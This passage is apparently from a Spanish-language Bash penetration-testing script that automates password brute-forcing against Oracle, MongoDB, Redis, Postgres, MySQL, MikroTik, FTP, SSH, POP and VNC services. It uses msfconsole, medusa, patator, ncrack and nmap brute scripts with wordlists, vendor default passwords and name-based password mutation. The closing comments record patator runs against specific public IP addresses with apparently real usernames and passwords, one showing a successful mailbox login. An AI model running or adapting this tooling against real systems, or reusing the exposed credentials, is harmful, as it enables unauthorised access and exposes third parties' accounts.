		msfconsole -x "use auxiliary/admin/oracle/oracle_login;set RHOSTS $ip;run;exit" > logs/vulnerabilidades/"$ip"_mongo_passwordBD.txt 2>/dev/null
		egrep --color=never 'Found' logs/vulnerabilidades/"$ip"_mongo_passwordBD.txt | tee -a .vulnerabilidades/"$ip"_mongo_passwordBD.txt

		SIDS=`grep '|' logs/vulnerabilidades/"$ip"_"$port"_oracleSids.txt | grep -v oracle-sid-brute | awk '{print $2}'`
		
		for SID in $SIDS; do
			echo -e "[+] Probando SID $SID"
			odat.sh passwordguesser -s $ip -p 1521 -d $SID --accounts-file /usr/share/wordlists/oracle_default_userpass.txt > logs/vulnerabilidades/"$ip"_mongo_passwordBD.txt 
		done		
		
	 done	
	 insert_data
fi

if [ -f servicios/mongoDB.txt ]
then
	echo -e "$OKBLUE #################### MongoDB (`wc -l servicios/mongoDB.txt`) ######################$RESET"
	for line in $(cat servicios/mongoDB.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`		
		echo -e "[+] Escaneando $ip:$port"
		echo "nmap -n -sT -sV -p $port -Pn --script=mongodb-brute $ip"  > logs/vulnerabilidades/"$ip"_mongo_passwordBD.txt 2>/dev/null 
		nmap -n -sT -sV -p $port -Pn --script=mongodb-databases $ip  >> logs/vulnerabilidades/"$ip"_mongo_passwordBD.txt 2>/dev/null 
		grep "|" logs/vulnerabilidades/"$ip"_mongo_passwordBD.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_mongo_passwordBD.txt 				
	done	
	#insert clean data	
	insert_data	
fi

if [ -f servicios/postgres.txt ]
then

	echo -e "$OKBLUE\n\t#################### postgres ######################$RESET"	    
	 sed -i '1 i\postgres' top.txt	#adicionar password postgres
	 for line in $(cat servicios/postgres.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`			
		
		echo -e "[+] Probando $ip"
		echo "medusa -e n -u postgres -P top.txt -h $ip -M postgres" >>  logs/cracking/"$ip"_5432_passwordBD.txt
		medusa -e n -u postgres -P top.txt -h $ip -M postgres >>  logs/cracking/"$ip"_5432_passwordBD.txt
		
		echo -e "\n medusa -e n -u pgsql -P top.txt -h $ip -M postgres" >>  logs/cracking/"$ip"_5432_passwordBD.txt
		medusa -e n -u pgsql -P top.txt -h $ip -M postgres >>  logs/cracking/"$ip"_5432_passwordBD.txt
		
		#echo -e "\nmedusa -e n -u $ENTIDAD -P top.txt -h $ip -M postgres" >>  logs/cracking/"$ip"_5432_passwordBD.txt
		#medusa -e n -u $ENTIDAD -P top.txt -h $ip -M postgres >>  logs/cracking/"$ip"_5432_passwordBD.txt
		
		grep --color=never SUCCESS logs/cracking/"$ip"_5432_passwordBD.txt > .vulnerabilidades/"$ip"_5432_passwordBD.txt
		
	 done	
	 insert_data
fi


if [ -f servicios/MikroTik.txt ]
then
	  		      	  
	echo -e "$OKBLUE\n\t#################### Testing common pass MikroTik ######################$RESET"	
	for ip in $(cat servicios/MikroTik.txt); do		
		echo -e "[+] Probando $ip"
				
		echo "mkbrutus.py -t $ip -u admin --dictionary top.txt" >>  logs/cracking/"$ip"_8728_passwordMikroTik.txt		
		mkbrutus.py -t $ip -u admin --dictionary top.txt >>  logs/cracking/"$ip"_8728_passwordMikroTik.txt
		
		echo "" >> logs/cracking/"$ip"_8728_passwordMikroTik.txt
		echo "mkbrutus.py -t $ip -u $ENTIDAD --dictionary top.txt" >> logs/cracking/"$ip"_8728_passwordMikroTik.txt
		mkbrutus.py -t $ip -u $ENTIDAD --dictionary top.txt >> logs/cracking/"$ip"_8728_passwordMikroTik.txt

		grep --color=never successful logs/cracking/"$ip"_8728_passwordMikroTik.txt | grep -v "unsuccessful" > .vulnerabilidades/"$ip"_8728_passwordMikroTik.txt
		
		
		echo ""			
	done
	insert_data	
fi

if [ -f servicios/mysql.txt ]
then
       	
	echo -e "$OKBLUE\n\t#################### Testing common pass MYSQL (lennnto) ######################$RESET"	
	sed -i '1 i\mysql' top.txt	#adicionar password mysql
	for line in $(cat servicios/mysql.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Probando $ip"
		hostlive=`mysql -u mysql -pww $ip`				
		#error
		if [[ ${hostlive} == *"MySQL server through socket"*  ]];then   	  
			echo "El servicio no esta funcionando correctamente"
							
		else
			echo -e "\n medusa -e n -u root -P top.txt -h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt
			medusa -e n -u root -P top.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt
			
			echo -e "\n medusa -e n -u mysql -P top.txt -h $ip -M mysql" >> logs/cracking/"$ip"_3306_passwordBD.txt
			medusa -e n -u mysql -P top.txt -h $ip -M mysql >> logs/cracking/"$ip"_3306_passwordBD.txt
			
			echo -e "\n medusa -e n -u admin -P top.txt -h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt
			medusa -e n -u admin -P top.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt
			
			echo -e "\n medusa -e n -u administrator -P top.txt -h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt				
			medusa -e n -u administrador -P top.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt				
			
			#echo -e "\n medusa -e n -u $ENTIDAD  -P top.txt -h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt				
			#medusa -e n -u $ENTIDAD  -P top.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt				
			
			grep --color=never -i SUCCESS logs/cracking/"$ip"_3306_passwordBD.txt | tee -a .vulnerabilidades/"$ip"_3306_passwordBD.txt
			echo ""		
			
		fi				
	done
	insert_data			
fi



#if [ -f servicios/vmware.txt ]
#then

	#if [ "$TYPE" = NULL ] ; then
		#echo -e "\n\t $OKBLUE Encontre servicios de vmware activos. Realizar ataque de passwords ? s/n $RESET"	  
		#read bruteforce	     
	#fi
	  	
	#if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 
      	  
	  #echo -e "$OKBLUE\n\t#################### Testing common pass vmware ######################$RESET"	
	  #for line in $(cat servicios/vmware.txt); do
		#ip=`echo $line | cut -f1 -d":"`
		#port=`echo $line | cut -f2 -d":"`
		#echo -e "[+] Probando $ip"
#		medusa -e n -u root -P top.txt -h $ip -M vmauthd | tee -a  logs/cracking/"$ip"_vmware.txt	
		#medusa -e n -u $entidad  -P top.txt -h $ip -M vmauthd | tee -a  logs/cracking/"$ip"_vmware.txt
		#grep --color=never SUCCESS logs/cracking/"$ip"_vmware.txt > .vulnerabilidades/"$ip"_vmware_passwordAdivinadoServ.txt
#		echo ""			
	 #done
	 #insert_data
#	fi # if bruteforce
#fi


if [ -f servicios/mongoDB.txt ]
then     	  
	echo -e "$OKBLUE\n\t#################### Testing  mongoDB ######################$RESET"	
	for line in $(cat servicios/mongoDB.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Probando $ip"
		echo "nmap -n -sV -p $port --script=mongodb-brute $ip"  > logs/cracking/"$ip"_mongo_passwordBD.txt 2>/dev/null 
		nmap -n -sV -p $port --script=mongodb-brute $ip  >> logs/cracking/"$ip"_mongo_passwordBD.txt 2>/dev/null 
		# -- |     root:Password1 - Valid credentials		
		respuesta=`grep --color=never -iq "Valid credentials" logs/cracking/"$ip"_mongo_passwordBD.txt `
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then
			echo -n "[MongoDB] $respuesta" >> .vulnerabilidades/"$ip"_mongo_passwordBD.txt
		fi					 
		echo ""			
	done
	insert_data	
fi

if [ -f servicios/redis.txt ]
then
	 	  
	echo -e "$OKBLUE\n\t#################### Testing common pass redis ######################$RESET"	
	for line in $(cat servicios/redis.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "\n\t########### $ip #######"			
		echo "nmap -n -sV -p $port --script=redis-brute $ip"  > logs/cracking/"$ip"_mongo_passwordBD.txt 2>/dev/null 
		nmap -n -sV -p $port --script=redis-brute $ip  >> logs/cracking/"$ip"_mongo_passwordBD.txt 2>/dev/null 		
		respuesta=`grep --color=never -iq "Valid credentials" logs/cracking/"$ip"_mongo_passwordBD.txt `
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then
			echo -n "[Redis] $respuesta" >> .vulnerabilidades/"$ip"_mongo_passwordBD.txt
		fi			
		echo ""			
	done
	insert_data	
fi

#falta
if [ -f servicios/informix.txt ]
then	
   	  
	  echo -e "$OKBLUE\n\t#################### Testing common pass informix (SFI) ######################$RESET"	
	  for line in $(cat servicios/informix.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "\n\t########### $ip #######"			
		echo -e "\t [+] Probando password por defecto (SFI)"
		
		echo -e "\n medusa -u tbsai -p Tbsai -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
		medusa -u tbsai -p Tbsai -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
		
		echo -e "\n medusa -u tbsai -p tbsai -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
		medusa -u tbsai -p tbsai -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
		
		echo -e "\n medusa -u sfibak -p sfibak -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
		medusa -u sfibak -p sfibak -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
		
		echo -e "\n medusa -u sfi -p sfi -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
		medusa -u sfi -p sfi -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
		
		echo -e "\n medusa -u informix -p informix -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null		
		medusa -u informix -p informix -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null		
		
		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordSFI.txt > .vulnerabilidades/"$ip"_22_passwordSFI.txt 					
	 done
	 insert_data	
fi



if [ -f servicios/ftp.txt ]
then 
      	  
	echo -e "$OKBLUE\n\t#################### Testing pass FTP ######################$RESET"	
	for line in $(cat servicios/ftp.txt); do
	ip=`echo $line | cut -f1 -d":"`
	port=`echo $line | cut -f2 -d":"`
	
	
	######## revisar si no es impresora #####
	#banner ftp
	egrep -iq "Printer|JetDirect|LaserJet|KONICA|MULTI-ENVIRONMENT|Xerox" .banners2/"$ip"_21.txt
	noImpresora21=$?
	
	#banner telnet						
	noImpresora23=1		
	if [ -f .banners2/"$ip"_23.txt ] 
	then				
		egrep -iq "Printer|JetDirect|LaserJet|KONICA|MULTI-ENVIRONMENT|Xerox" .banners2/"$ip"_23.txt 2>/dev/null
		noImpresora23=$?
	fi
	
	#banner web
	noImpresora80=1		
	if [ -f .enumeracion2/"$ip"_80_webData.txt ] 
	then	
		egrep -iq "Printer|JetDirect|LaserJet|KONICA|MULTI-ENVIRONMENT|Xerox" .enumeracion2/"$ip"_80_webData.txt 2>/dev/null
		noImpresora80=$?
	fi
			
	echo "noImpresora21 $noImpresora21 noImpresora80 $noImpresora80 noImpresora23 $noImpresora23"
	if [[ $noImpresora21 -eq 1 && $noImpresora80 -eq 1 && $noImpresora23 -eq 1 ]] ; then			
		echo -e "[+] Probando $ip"		
		
		#echo -e "\n medusa -e n -u admin -P top.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
		#medusa -e n -u admin -P top.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
		
		echo -e "\n medusa -e n -u root -P top.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
		medusa -e n -u root -P top.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
		
		echo -e "\n medusa -e n -u ftp -P top.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt					
		medusa -e n -u ftp -P top.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt					
		
		respuesta=`grep --color=never SUCCESS logs/cracking/"$ip"_21_passwordAdivinadoServ.txt`
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then
			echo -n "[FTP] $respuesta" >> .vulnerabilidades/"$ip"_21_passwordAdivinadoServ.txt
		fi
		
		echo ""		
	else			
		echo -e "\t[+] Es una impresora"			

		echo ""		
	fi	
	#######################################		
			
	done
	insert_data	 
fi

#echo -e "\t $OKBLUE REVISANDO ERRORES $RESET"
#grep -ira "timed out" logs/cracking/* 2>/dev/null >> errores.log
#grep -ira "Can't connect" logs/cracking/* 2>/dev/null >> errores.log

exit

if [ -f servicios/pop.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios de POP activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
    then     			
      echo -e "\n\t $OKBLUE Archivo con la lista de usuarios? Formato: Daniel;Torres;Sandi $RESET"	  
	  read users_file  	  
	  
	  echo -e "$OKBLUE\n\t#################### Testing common pass POP ######################$RESET"	
	  for line in $(cat servicios/pop.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "\n\t########### $ip #######"	
		for fullname in $(cat $users_file); do
			echo -e "\n\t########### Testing fullname $fullname #######"			
			generate_password.pl "$fullname" > passwords2.txt # password en base a su usuario
			head -1 passwords2.txt > base.txt # solo primer nombre
			passGen.sh -f base.txt -t top50 -o passwords3.txt # mutaciones de su nombre
			cat passwords2.txt passwords3.txt top.txt| sort | uniq > passwords.txt			
			username=`tail -1 passwords2.txt` # dtorres
			echo -e "\n\t[+] username $username"			
			patator pop_login host=$ip user=$username password=FILE0 0=passwords.txt >> logs/cracking/"$ip"_pop-$username.txt 2>> logs/cracking/"$ip"_pop-$username.txt		
			grep --color=never messages logs/cracking/"$ip"_pop-$username.txt >> .vulnerabilidades/"$ip"_pop_passwordAdivinadoServ.txt
			echo ""					
			rm passwords.txt passwords2.txt passwords3.txt			
			echo "Dormir 5 min"
			sleep 300;
		done					
		echo ""			
	 done
	 insert_data
	fi # if bruteforce
fi
	

if [ -f servicios/pop3pw.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios de pop3pw activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
    then     			
      echo -e "\n\t $OKBLUE Archivo con la lista de usuarios? Formato: Daniel;Torres;Sandi $RESET"	  
	  read users_file  	  
	  
	  echo -e "$OKBLUE\n\t#################### Testing common pass POP  ######################$RESET"	
	  for line in $(cat servicios/pop3pw.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "\n\t########### $ip #######"	
		for fullname in $(cat $users_file); do
			echo -e "\n\t########### Testing fullname $fullname #######"			
			generate_password.pl "$fullname" > passwords2.txt # password en base a su usuario
			head -1 passwords2.txt > base.txt # solo primer nombre
			passGen.sh -f base.txt -t top50 -o passwords3.txt # mutaciones de su nombre
			cat passwords2.txt passwords3.txt top.txt| sort | uniq > passwords.txt			
			username=`tail -1 passwords2.txt` # dtorres
			echo -e "\n\t[+] username $username"			
			patator pop_passd host=$ip user=$username password=FILE0 0=passwords.txt >> logs/cracking/"$ip"_pop3pw-$username.txt 2>> logs/cracking/"$ip"_pop3pw-$username.txt		
			grep --color=never "new password " logs/cracking/"$ip"_pop3pw-$username.txt >> .vulnerabilidades/"$ip"_pop3pw_passwordAdivinadoServ.txt
			echo ""					
			rm passwords.txt passwords2.txt passwords3.txt			
			echo "Dormir 5 min"
			sleep 300;
		done					
		echo ""			
	 done
	 insert_data
	fi # if bruteforce
fi	


if [ -f servicios/vnc.txt ]
then   	  
	  echo -e "$OKBLUE\n\t#################### Testing common pass VNC (lennnto) ######################$RESET"	
	  for line in $(cat servicios/vnc.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "\n\t########### $ip #######"					
		ncrack_instances=`pgrep ncrack | wc -l`
		if [ "$ncrack_instances" -lt $max_ins ] #Max 10 instances
		then
			ncrack --user 'administrator' -P top.txt -p $port -g cd=8 $ip | tee -a  logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &			
			echo ""		
		else
			echo "Max instancias de ncrack ($max_ins)"
			sleep 10;
				
		fi		
		
	  done
	  
	  sleep 5
	  ### wait to finish
	  while true; do
		ncrack_instances=`pgrep ncrack | wc -l`
		if [ "$ncrack_instances" -gt 0 ]
		then
			echo "Todavia hay escaneos de ncrack activos ($ncrack_instances)"  
			sleep 30
		else
			break		  		 
		fi				
	  done
	
	  echo -e "\n\t########### Checking success #######"	
	  for line in $(cat servicios/vnc.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
						
		grep --color=never "administrator" logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
		echo ""			
	  done
	 	 	 
	 insert_data	
fi
	

#patator pop_login host=181.115.239.243 user=msanti password='Bichito$9'
#17:20:24 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2018-10-22 17:20 EDT
#17:20:24 patator    INFO -                                                                              
#17:20:24 patator    INFO - code  size   time | candidate                          |   num | mesg
#17:20:24 patator    INFO - -----------------------------------------------------------------------------
#17:20:25 patator    INFO - +OK   32    0.094 |                                    |     1 | 3076 messages (263203895 octets)


#patator pop_passd host=190.129.11.29 user=jaguilar password=jhashy275
#16:40:34 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2018-10-22 16:40 EDT
#16:40:34 patator    INFO -                                                                              
##16:40:34 patator    INFO - code  size   time | candidate                          |   num | mesg
#16:40:34 patator    INFO - -----------------------------------------------------------------------------
#16:40:34 patator    INFO - 200   25    0.127 |                                    |     1 | Your new password please